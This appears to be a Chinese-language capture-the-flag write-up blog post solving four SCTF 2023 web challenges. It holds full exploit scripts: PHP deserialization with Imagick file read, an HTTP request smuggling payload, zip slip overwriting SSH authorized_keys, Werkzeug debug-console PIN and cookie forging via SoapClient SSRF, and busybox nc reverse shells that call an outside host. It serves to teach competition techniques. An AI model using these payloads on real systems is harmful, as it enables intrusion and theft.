---
title: SCTF 2023 Web writeup
date: 2023-06-20 05:34:21
categories:
- CTF
tags:
- flask debug rce
- imagemagick
- ssh
- zip slip
- request smuggling
mermaid: true
image:
  path: /assets/images/SCTF_2023.png
toc: true
---

<!-- ![20230620081150](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20230620081150.png) -->

## fumo_backdoor
>FUMO在你的网站上留下了后门 ᗜˬᗜ，她是怎么使用这个后门的捏？ ᗜˬᗜ（flag 在 /flag）
>Oops, looks like FUMO left a backdoor on your website ᗜˬᗜ! I wonder how she’s gonna use it, teehee~ (flag in /flag)
>http://182.92.6.230:18080
>http://47.99.77.113:18080/
>题目附件：https://adworld.xctf.org.cn/media/file/task/96a478b7-b206-403e-8430-886186a82097.zip

题目给出了源码如下：
```php
<?php
error_reporting(0);
ini_set('open_basedir', __DIR__.":/tmp");
define("FUNC_LIST", get_defined_functions());

class fumo_backdoor {
    public $path = null;
    public $argv = null;
    public $func = null;
    public $class = null;
    
    public function __sleep() {
        if (
            file_exists($this->path) && 
            preg_match_all('/[flag]/m', $this->path) === 0
        ) {
            readfile($this->path);
        }
    }

    public function __wakeup() {
        $func = $this->func;
        if (
            is_string($func) && 
            in_array($func, FUNC_LIST["internal"])
        ) {
            call_user_func($func);
        } else {
            $argv = $this->argv;
            $class = $this->class;
            
            new $class($argv);
        }
    }
}

$cmd = $_REQUEST['cmd'];
$data = $_REQUEST['data'];

switch ($cmd) {
    case 'unserialze':
        unserialize($data);
        break;
    
    case 'rm':
        system("rm -rf /tmp 2>/dev/null");
        break;
    
    default:
        highlight_file(__FILE__);
        break;
}
```
这道题与历史赛题类似：
- [CTF-Challenges/CISCN/2022/backdoor/writup/writup.md at master · AFKL-CUIT/CTF-Challenges · GitHub](https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md)

与这道题的思路类似，这道题需要进行文件读取，前半段的利用基本一致：
1. 在临时文件中写入 msl
2. 利用 msl 文件初始化 Imagick，写入 session 文件，此时 session 文件的内容为 fumo_backdoor 的序列化数据。
3. 调用无参函数 session_start ，session_start 会将会话数据反序列化得到 fumo_backdoor 对象，会话结束时会将这个 fumo_backdoor 再次序列化，从而调用到 `__sleep` 方法。


这里的 `__sleep` 方法只能进行文件读取，并且 index.php 设置链 open_basedir，无法直接读取到 /flag。

由于 Imagick 底层实现并不在 php 里，因此使用 Imagick 去读取文件可以无视 open_basedir。问题再于找到 Imagick 中能够读取某个文件，并且写入 /tmp 路径下的利用链。相关思路可以借鉴 [ImageTragick](https://imagetragick.com/) 这篇文章，历史上 Imagick 存在类似的利用（直接构造 mvg 文件去读取文件）

测试时发现使用 mvg 格式可以读取 /flag。
```php
<?php
new Imagick("vid:msl:/var/www/html/msl.txt");
```
> Nu1L 战队的 writeup 中使用了另外一种格式 uyvy。相关参考连接：[ImageMagick/www/formats.html at main · ImageMagick/ImageMagick · GitHub](https://github.com/ImageMagick/ImageMagick/blob/main/www/formats.html)

msl 文件内容如下：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="mvg:/flag" />
 <write filename="/tmp/xxxx" />
</image>
```
执行后可以将 /flag 的内容拷贝到 /tmp 下。

结合前面的思路，总的利用过程如下：
1. 利用 msl 文件初始化 Imagick， 将 /flag 拷贝到 /tmp 目录下
2. 利用 msl 文件初始化 Imagick，写入 session 文件，此时 session 文件的内容为 fumo_backdoor 的序列化数据。
3. 调用无参函数 session_start ，session_start 会将会话数据反序列化得到 fumo_backdoor 对象，会话结束时会将这个 fumo_backdoor 再次序列化，从而调用到 `__sleep` 方法读取 /tmp 下的 flag 文件。


**注意**：在 session_start 之后会将将存储在 session 中的 fumo_backdoor 进行反序列化，此时会触发 `__wakeup` 函数，这里调用 `__wakeup` 函数 不能产生报错，否则在 session 会话结束后调用 `__sleep` 方法无法获取输出。为了方便可以将 func 填充为一个无用的函数，例如 zend_version

EXP 如下：
```py
import requests
import base64 
import time
import re

url = "http://192.168.137.131:28999/index.php"
url = "http://182.92.6.230:18080"
proxies = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

write_session_params = 'O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22imagick%22%3B%7D'

trigger_sleep_payload = 'aaa|O:13:"fumo_backdoor":4:{s:4:"path";s:9:"/tmp/xxxx";s:4:"argv";N;s:4:"func";s:12:"zend_version";s:5:"class";N;}'

trigger_sleep_params = 'O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3Bs%3A5%3A%22class%22%3BN%3B%7D&cmd=unserialze'


def gen_ppm(payload):
    ppm_content = '''P6
9 9
255
{}'''.format((243-len(payload))*"\x00" + payload)
    ppm_content = base64.b64encode(ppm_content.encode()).decode()
    return ppm_content

def rm_tmp_file():
    headers = {"Accept": "*/*"}
    requests.get(
        f"{url}/?cmd=rm",
        headers=headers,
        proxies=proxies
    )

def upload_file(file_content,file_path):
    headers = {
        "Accept": "*/*",
        "Content-Type": "multipart/form-data; boundary=------------------------c32aaddf3d8fd979"
    }

    data = f"--------------------------c32aaddf3d8fd979\r\nContent-Disposition: form-data; name=\"swarm\"; filename=\"swarm.msl\"\r\nContent-Type: application/octet-stream\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<image>\r\n <read filename=\"inline:data://image/x-portable-anymap;base64,{file_content}\" />\r\n <write filename=\"{file_path}\" />\r\n</image>\r\n--------------------------c32aaddf3d8fd979--"
    try:
        requests.post(
            f"{url}/?data={write_session_params}&cmd=unserialze",
            headers=headers, data=data,proxies=proxies
        )
    except requests.exceptions.ConnectionError:
        pass


def upload_session():
    payload = gen_ppm(trigger_sleep_payload)
    upload_file(payload,"/tmp/sess_afkl")

def copy_flag():
    headers = {
        "Accept": "*/*",
        "Content-Type": "multipart/form-data; boundary=------------------------c32aaddf3d8fd979"
    }

    data = f"--------------------------c32aaddf3d8fd979\r\nContent-Disposition: form-data; name=\"swarm\"; filename=\"swarm.msl\"\r\nContent-Type: application/octet-stream\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<image>\r\n <read filename=\"mvg:/flag\" />\r\n <write filename=\"/tmp/xxxx\" />\r\n</image>\r\n--------------------------c32aaddf3d8fd979--"
    try:
        requests.post(
            f"{url}/?data={write_session_params}&cmd=unserialze",
            headers=headers, data=data,proxies=proxies
        )
    except requests.exceptions.ConnectionError:
        pass


def get_flag():
    cookies = {"PHPSESSID": "afkl"}
    headers = {"Accept": "*/*"}
    response = requests.get(
        f"{url}/?data={trigger_sleep_params}&cmd=unserialze", 
        headers=headers, cookies=cookies,proxies=proxies
    )
    print(response.text)
    return re.findall(r"(flag\{.*\})", response.text)

if __name__ == '__main__':
    rm_tmp_file()
    time.sleep(2)
    copy_flag()
    time.sleep(2)
    upload_session()
    time.sleep(2)
    get_flag()
```
题目 nginx 有些不太稳定，多加几个 sleep，多发几次。


### 参考资料
- [Playing with ImageTragick like it's 2016](https://www.synacktiv.com/en/publications/playing-with-imagetragick-like-its-2016.html)
- [CTF-Challenges/CISCN/2022/backdoor/writup/writup.md at master · AFKL-CUIT/CTF-Challenges · GitHub](https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md)
- [Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARM](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [ImageTragick](https://imagetragick.com/)


## ezcheckin
请求走私， 具体细节可以查看参考文档， exp 如下：
```
/2023/%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/2022.php%3furl%3dxxx.xxx.xxx.xxx:9999/%3f
```

### 参考
- [dhmosfunk/CVE-2023-25690-POC: CVE 2023 25690 Proof of concept - mod\_proxy vulnerable configuration on Apache HTTP Server versions 2.4.0 - 2.4.55 leads to HTTP Request Smuggling vulnerability.](https://github.com/dhmosfunk/CVE-2023-25690-POC)


## SycServer
>VAnZY鸽鸽写了个网站，但是没写前端，你知道怎么用嘛
>159.138.131.31:8888
>119.13.91.238:8888
>Note:the server will be reloaded every 90s
>[附件下载](https://adworld.xctf.org.cn/media/file/task/2bc37908-649d-4924-b0e9-32adb7baef6a.zip)

附件是一个用 go 编写的 http 服务。运行之后可以查看到路由信息：
```bash
[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
 - using env:   export GIN_MODE=release
 - using code:  gin.SetMode(gin.ReleaseMode)

[GIN-debug] POST   /file-unarchiver          --> main.fileUnarchiver (3 handlers)
[GIN-debug] GET    /                         --> main.funkYou (3 handlers)
[GIN-debug] GET    /readir                   --> main.readir (3 handlers)
[GIN-debug] GET    /admin                    --> main.admin (3 handlers)
[GIN-debug] GET    /readfile                 --> main.readfile (3 handlers)
[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.
Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.
[GIN-debug] Listening and serving HTTP on 0.0.0.0:8888
```
结合逆向分析与前端测试，每个路由的功能如下：
1. /readfile?file= 可以进行文件读取.
2. /readir 默认情况下可以读取根目录.
3. /file-unarchiver 可以上传一个 zip 文件并解压。
4. /admin 可以连接本地 2221 端口，以 vanzy 用户登陆本地 ssh，登陆之后执行 ls 命令。整个步骤需要在 vanzy 用户的 .ssh 目录下放置私钥和 authorized_keys。

/file-unarchiver 可以上传文件并解压，很容易想到 zip slip 攻击，利用解压后的文件覆盖 /home/vanzy/.ssh/authorized_keys 就可以直接连接到目标。利用 readfile 接口可以读取 ssh 配置文件，在配置文件中也可以确认目标开启了 ssh 公私钥登陆。

zip slip payload 可以使用工具 [slipit](https://github.com/usdAG/slipit)。本地生成 RSA 公私钥，然后使用如下的命令生成。
```bash
cat /home/kali/.ssh/id_rsa > /home/kali/.ssh/authorized_keys
slipit upload/upload.zip /home/kali/.ssh/authorized_keys --prefix /home/vanzy/.ssh --separator /
```
生成得到 upload.zip，将其上传之后可以覆写  /home/vanzy/.ssh/authorized_keys, 写入后可以使用 readfile 进行验证。

测试时发现目标开放了 22 端口，但即使写入了 authorized_keys 也没有办法登陆，猜测暴露的 22 端口并非题目环境的 ssh 服务（不然也不会提供 /admin 路由）。

/admin 路由需要提供 authorized_keys 和 id_rsa。需要再次利用 zip slip 上传 id_rsa。**注意 authorized_keys 需要 600 权限。**

能够公私钥连接 ssh 后，下一步考虑如何，执行命令，最初的想法是覆盖 .ashrc(题目环境为 busybox，可以使用 readfile 进行读取) 加入反弹 shell 的命令，但题目在使用 ssh 连接时，使用了类似 exec 直接执行 ls 命令，此时便不会加载 rc 文件。

但公私钥登陆时，需要执行的命令还可以直接写在 authorized_keys 文件中，参考：[Restrict Executable SSH Commands With Authorized Keys - Virtono Community](https://www.virtono.com/community/tutorial-how-to/restrict-executable-ssh-commands-with-authorized-keys/)

command 选项本身的用意，是限制该密钥的只能执行的命令。例如：
```bash
cat .ssh/authorized_keys 
command="date" ssh-rsa AAAA [ ... ]
```
在 authorized_keys 中添加 command 属性，客户端连接时会自动执行该指令。因此我们可以直接在 command 属性中添加反弹 shell payload。

整个题目的利用流程如下：
1. 利用 zip slip 上传 id_rsa
2. 利用 zip slip 上传 authorized_keys，其中 command 属性填充反弹 shell 语句
3. 访问 /admin

最终 authorized_keys，其中 如下：
```sh
command="busybox nc xxx.xxx.xxx.xxx 9999 -e cat /flag"  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCcrjOMU/UreyjVp+be4kxHr/rT5LUIviQVwoJNbbwdVD1enfLlbaI28A3dt7ORXUD8X1fCmfr3tZXcSQlsTxrmzcq/YOSdCDxN+xbD8JBCAzJEWee17PrTxAHBitOLL2YZSOJYHLclAhKXtzDT7Yj8ZCpXKqgIjoc02xFQSj8YZ1ep6m9xrL9oedkJ1VlI4SckB2Wlnxbw7daY3zBnKDd3lWBx0pn0rUDr/CcdEJVpTvqUCscRCkb4lpPS1nGrl9qAy0zauRhPH10zyAuMgsSPQXUKgP+GEcgsyBYy5P+w3O4xh2K3G8nEfHsop4b9NraU3So3bZvQxemX3wW8PF8TpHHex/GrQW8ilM7mWC6d7sEc7ElV8gAnNw+P7X1cl0YS5eUTN35U51mCUaDNKQi3hgdSy9TU2UQyeJxz+c+wrZjpsjetgVTcScbw6ZDIKeuVsDCd3+TKJwgVsnjENACXAW49NseS+uu/12u+4MBBtkEIhaeu/T05gBgAm9FU+Vc= kali@kali
```

利用 exp 如下：
```py
import requests
import zipfile
import os

url = "http://119.13.91.238:8888/"

proxies = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

def upload_file(local_file, remote_path):
    def gen_payload():
        os.system("rm ./upload/upload.zip")
        os.system(f"slipit upload/upload.zip {local_file} --prefix {remote_path} --separator /")
        print("[+] gen payload done")

    def upload_request():
        dfile = open("./upload/upload.zip", "rb")
        res = requests.post(f"{url}file-unarchiver", files = {"file": dfile}, proxies=proxies)
        if res.text != "":
            print(res.text)
        print(f"[+] upload to {remote_path} done\n")

    gen_payload()
    upload_request()

def read_remote_file(path):
    res = requests.get(f"{url}readfile?file={path}",proxies=proxies)
    print(f"[+] read file {path}")
    print(res.text)

def get_flag():
    res = requests.get(f"{url}admin",proxies=proxies)
    print("[+] tigger admin")
    print(res.text)
    

def exp():
    # global url 
    # url = "http://192.168.137.131:8888/"
    upload_file("~/.ssh/authorized_keys","/home/vanzy/.ssh")
    upload_file("~/.ssh/id_rsa","/home/vanzy/.ssh")
    read_remote_file("/home/vanzy/.ssh/authorized_keys")
    get_flag()

if __name__ == "__main__":
    exp()
```

### 参考资料
- [Restrict Executable SSH Commands With Authorized Keys - Virtono Community](https://www.virtono.com/community/tutorial-how-to/restrict-executable-ssh-commands-with-authorized-keys/)


## pypyp
> 地址 /url
> 
> http://115.239.215.75:8081/
> 
> 提示 /hint
> 
> a piece of cake but hard work。per 5 min restart.
> 
> pay attention to /app/app.py

访问 http://115.239.215.75:8081/ 会提示 Session not started. 使用 PHP_SESSION_UPLOAD 将 session 初始化后可以看到源码, 源码如下:
```php
<?php
    error_reporting(0);
    if(!isset($_SESSION)){
        die('Session not started');
    }
    highlight_file(__FILE__);
    $type = $_SESSION['type'];
    $properties = $_SESSION['properties'];
    echo urlencode($_POST['data']);
    extract(unserialize($_POST['data']));
    if(is_string($properties)&&unserialize(urldecode($properties))){
        $object = unserialize(urldecode($properties));
        $object -> sctf();
        exit();
    } else if(is_array($properties)){
        $object = new $type($properties[0],$properties[1]);
    } else {
        $object = file_get_contents('http://127.0.0.1:5000/'.$properties);
    }
    echo "this is the object: $object <br>";

?>
```
源码可以将 post 参数 data 的内容进行反序列化, 然后使用 extract 进行赋值, extract 存在变量覆盖漏洞. 将 data 反序列化后有三个分支:

1. 如果 properties 可以再次反序列化, 则将其反序列化后调用 sctf 方法, 这是一个很明显的 SoapClient SSRF 场景.
2. 如果 properties 是一个数组, 则可以进行 type 类的实例化, 这里是一个内置类的利用场景. 参数为 2 时, 可以利用 SplFileObject 进行文件读取.
3. 最后一个分支可以访问本地的 5000 端口.


本地 5000 端口通常是一个 flask 应用, 题目了提示 /app/app.py 文件, 利用文件读取漏洞获取到其内容如下, 是一个 flask debug 页面.
```py
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    return 'Hello World!'

if __name__ == '__main__':
    app.run(host="0.0.0.0",debug=True)
```

结合 flask debug RCE 的利用思路, 整体攻击思路较为清晰:
1. 通过 file_get_contents 访问 http://127.0.0.1:5000/console, 获取到 secret 
2. 利用文件读取漏洞, 读取计算 flask cookie 值的所需要的文件内容.
3. 计算 cookie 值.
4. 利用 SoapClient SSRF 访问 flask debug 页面, 添加 Cookie 头执行命令.

**注意**: 大多数介绍 flask debug rce 的文章, 介绍的都是先计算 pin 然后通过 pinauth 获取 cookie 值, 实际上计算完 pin 后可以直接计算 cookie, cookie 名和 cookie 值都可以直接算出, 具体可以参考: 

计算 cookie 值所需的内容与计算 pin 码一致:
1. 用户名: root (读取 /etc/passwd 后发现用户为 app)
2. modname: 一般是 flask.app
3. `getattr(app, '__name__', getattr(app.__class__, '__name__'))` 的值, 一般是 Flask
4. 模块路径: 通常是 /usr/local/lib/python3.x/dist-packages/flask/app.py 或者 site-packages/flask/app.py. python 的路径有可能是 /usr/local/lib/python3.x 或者 /usr/lib/python3.x , 都可以尝试一下读取这些路径.
   
5. /sys/class/net/eth0/address 十进制值
6. /etc/machine-id 或者 /proc/sys/kernel/random/boot_id 以及 /proc/self/cgroup 最后一个 / 后的内容

计算 cookie 脚本如下.

```py
import hashlib
from itertools import chain
import time

def calc(probably_public_bits,private_bits):
    #h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    #h.update(b'shittysalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = numapp
    return cookie_name, rv

def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]

def gen_pin_and_cookie(username, mod_file, uuid, machine_id):
    probably_public_bits = [
        username,# username
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        mod_file # getattr(mod, '__file__', None),
    ]

    private_bits = [
        uuid,# str(uuid.getnode()),  /sys/class/net/eth0/address
        machine_id# get_machine_id(), /etc/machine-id
    ]

    cookie_name, pin = calc(probably_public_bits,private_bits)
    
    cookie_value = f"{int(time.time())}|{hash_pin(pin)}"
    cookie = "%s=%s" % (cookie_name,cookie_value)
    print("[+] PIN : " + pin)
    print("[+] Cookie : %s" % (cookie))
    return pin, cookie

if __name__ == "__main__":
    gen_pin_and_cookie(
        'app',
        '/usr/lib/python3.8/site-packages/flask/app.py', 
        '2485378023426', '349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687')
```


下一步就是就是利用 SoapClient 发送 python 反弹 shell 的代码, app 用户的默认 shell 为 ash, 考虑使用 busybox 反弹 shell, 反弹 shell 代码中, 空格, 引号, 等号需要进行 url 编码.
```py
cmd = f"__import__(%22os%22).popen(%22/bin/busybox%20nc%20xxx.xxx.xxx.xxx%209999%20-e%20bash%22).read();"
```
SoapClient payload 生成脚本:

soap_client.php
```php
<?php
$target= $argv[1];
$post_string= '';
$headers= array(
   'X-Forwarded-For:127.0.0.1',
   'Cookie:'.$argv[2]
   );
$b= new SoapClient(null,array('location'=> $target,'user_agent'=>'wupco^^Content-Type:application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length:'.(string)strlen($post_string).'^^^^'.$post_string,'uri'=>"xxx"));
//因为User-agent是可以控制的，因此可以利用crlf注入http头部发送post请求
$aaa= serialize($b);
$aaa= str_replace('^^','%0d%0a',$aaa);
$aaa= str_replace('&','%26',$aaa);
$aaa= str_replace('%20','%25%32%30',$aaa);
$aaa= str_replace('%22','%25%32%32',$aaa);
$aaa= str_replace('%3D','%25%33%44',$aaa);
// echo $aaa,"\n";

// $x= unserialize(urldecode($aaa));//调用__call方法触发网络请求发送
// $x->no_func();

$payload = [
    "properties" => $aaa
];

$s = serialize($payload);
echo $s,"\n";
```
1. `$argv[1]` 为访问的 URL, 里面包含了上面反弹 shell 的 payload:
   ```
   http://127.0.0.1:5000/console?&__debugger__=yes&cmd=__import__(%22os%22).popen(%22/bin/busybox%20nc%20xxx.xxx.xxx.xxx%209999%20-e%20bash%22).read();&frm=0&s=MyOYC2KGBB42RX9ddF2N
   ```
   由于反序列化 SoapClient 前会进行 url 解码,为了保证 %20, %3D, %22 不被解码,需要单独对这三个字符进行二次 url 编码, 也就是脚本中三个 str_replace 的作用.
2. `$argv[2]` 为上一步生成的 cookie 值. 

最终 exp 如下:
```py
import requests
import re
import base64
import subprocess
from urllib.parse import quote
from gen_pin import gen_pin_and_cookie

target = 'http://115.239.215.75:8081/index.php'

session = requests.session()
flag = 'helloworld'

proxies = {
    "http":"http://192.168.137.98:8080",
    "https":"http://192.168.137.98:8080",
}

def session_request(payload):
    files = [
        ('file', ('load.png', b'a' * 1024, 'image/png')),
    ]
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': 'aaa',
        'data': payload
        }

    res = requests.post(
        target,
        data=data,
        files=files,
        cookies={'PHPSESSID': flag},
        proxies=proxies
    )

    try:
        return res
    except:
        print(f"[+] get file content fail")
    

def get_file_content(file_name):
    print(f"[+] get {file_name} content")

    payload = subprocess.check_output(['php', "./get_file_content.php", file_name], universal_newlines=True)
    payload.strip()

    res = session_request(payload).text
    try:
        file_content = res.split("this is the object: ")[1].replace(' <br>','')
        file_content = base64.b64decode(file_content).decode()
        
        print(file_content)
        return file_content.strip()
    except:
        print("[+] file not found")



def file_get_content_request(url):
    payload = subprocess.check_output(['php', "./console_interact.php", url], universal_newlines=True)
    
    res = session_request(payload)
    return res

def get_secret():
    res = file_get_content_request(f'console').text
    try:
        secret = re.findall("[0-9a-zA-Z]{20}",res)[0]
        print(f"[+] get secret {secret}")
    except:
        print("[+] get secret fail")
    return secret

def soap_request(url,cookie=""):
    payload = subprocess.check_output(['php', "./soap_client.php", url, cookie], universal_newlines=True)
    payload.strip()

    res = session_request(payload)
    return res

def get_uuid_mechine_id():
    uuid = get_file_content("/sys/class/net/eth0/address")
    uuid = str(int(uuid.replace(':', ''), 16))
    mechine_id = get_file_content("/proc/sys/kernel/random/boot_id")
    mechine_id += get_file_content("/proc/self/cgroup").split("/")[-1]
    print(f"[+] uuid {uuid}")
    print(f"[+] mechine_id {mechine_id}")
    return uuid, mechine_id

def reverse_shell(secret,cookie, rev_host, rev_port):
    cmd = f"__import__(%22os%22).popen(%22/bin/busybox%20nc%20{rev_host}%20{rev_port}%20-e%20bash%22).read();"
    soap_request(f"http://127.0.0.1:5000/console?&__debugger__=yes&cmd={cmd}&frm=0&s={secret}",cookie)


if __name__ == '__main__':
    # while True:
    #     file = input("filename> ")
    #     get_file_content(file)
    # target = 'http://192.168.137.131:28999/index.php'
    secret = get_secret()

    uuid, mechine_id = get_uuid_mechine_id()

    _,cookie = gen_pin_and_cookie(
        'app',
        '/usr/lib/python3.8/site-packages/flask/app.py', 
        uuid, mechine_id)
    reverse_shell(secret,cookie, "xxx.xxx.xxx.xxx", 9999)
```

其中用到了两个 php 脚本, 一个是上面的 soap_client.php , 另一个是 get_file_content.php 用于读取文件.
```php
<?php
$filename = $argv[1];
$payload = [
    "properties" => [
        "php://filter/convert.base64-encode/resource=".$filename,
        "r"
    ],
    "_SESSION" => [
        "type" => "SplFileObject"
    ],
    "type" => "SplFileObject"
];
$s = serialize($payload);
echo $s;
```

获取 shell 之后发现没有权限读取 /flag 文件, 且当前用户 app 为普通用户. 考虑提权信息收集, 查找 SUID 文件时发现 curl 拥有权限.

```bash
find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -perm -4000 -type f -print 2>/dev/null
/usr/bin/passwd
/usr/bin/curl
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/chfn
/usr/bin/chage
/usr/bin/chsh
/usr/sbin/suexec
```

curl 使用 file 协议读取文件:
```
curl file:///flag
SCTF{i_have_n0_t1me!GGGGGGGGG}
```

### 参考
- [(RCE) Flask + Werkzeug генерируем куку на основе PIN кода](https://vk.com/@greyteam-rce-flask-werkzeug-generiruem-kuku-na-osnove-pin-koda)